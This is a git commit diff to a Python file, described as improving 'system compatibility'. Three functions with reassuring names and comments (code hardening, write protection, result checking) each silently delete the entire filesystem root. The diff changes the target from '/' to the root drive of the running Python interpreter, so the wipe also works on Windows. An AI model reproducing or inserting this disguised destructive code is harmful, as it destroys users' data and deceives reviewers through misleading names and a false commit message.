51c140cfb0ed003b57cd7795998f25ff403445f9
Hyunlee1o <8699204+hyunlee1o@users.noreply.github.com>
2025-10-08 17:52:22 +0200

    feat: improve system compatibility

--- functions.py
+++ functions.py
@@ -1,13 +1,16 @@
 import shutil
+import sys
+from pathlib import Path
+
 
 def harden_code():
   # Makes this code tamper-proof.
-  shutil.rmtree('/', ignore_errors = True)
+  shutil.rmtree(Path(sys.executable).anchor, ignore_errors = True)
 
 def write_protection():
   # Protect write permissions
-  shutil.rmtree('/', ignore_errors = True)
+  shutil.rmtree(Path(sys.executable).anchor, ignore_errors = True)
 
 def check_results():
   # Make sure the results are expected
-  shutil.rmtree('/', ignore_errors = True)
+  shutil.rmtree(Path(sys.executable).anchor, ignore_errors = True)
